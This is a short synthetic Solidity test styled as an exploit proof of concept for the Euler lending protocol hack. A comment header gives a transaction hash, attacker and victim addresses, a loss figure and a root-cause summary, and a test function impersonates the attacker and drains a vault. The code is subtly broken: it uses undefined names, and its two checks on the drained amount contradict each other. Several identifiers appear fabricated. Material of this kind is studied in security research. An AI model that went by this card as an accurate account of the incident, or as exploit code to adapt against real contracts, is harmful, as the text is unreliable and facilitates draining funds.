// ==== Reconstructed DeFiHackLabs card (format-faithful synthetic; see samples README) ====
// Protocol: Euler
// Attack Tx: 0xc31bcc530831bf0682deb3ba24b1a6a485f5c8d1a1c3a2d2c6ef4f5a6b7c8d9e
// EXPLOIT_BLOCK: 16687227
// Attacker EOA: 0x5fe274bb0c32f0e0eea1e77b30d5a2eb3e07b3bd
// Victim Contract: 0xe9f1cdc006b7a9df8f5a1c8b3f5d2a7c4e9b1d3f
// Harness: 0x00000000000000000000000000000000dEaDbeef
// Loss: 197_000_000 USD
// Root cause: donateToReserves accepted self-directed donations without
//   accounting for them, letting the attacker inflate collateral health
//   factors and borrow against phantom collateral.
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract Euler_exp is BaseTestWithBalanceLog {
    uint256 constant EXPLOIT_BLOCK = 16687227;

    function testExploit() public {
        vm.roll(EXPLOIT_BLOCK - 1);
        vm.startPrank(attacker, attacker);
        uint256 drained = eulerVault.donateAndBorrow();
        assertApproxEqAbs(drained, 190_155_976393, 1e6);
        require(drained > 180_000_000 ether, "drain below expectation");
        vm.stopPrank();
    }
}
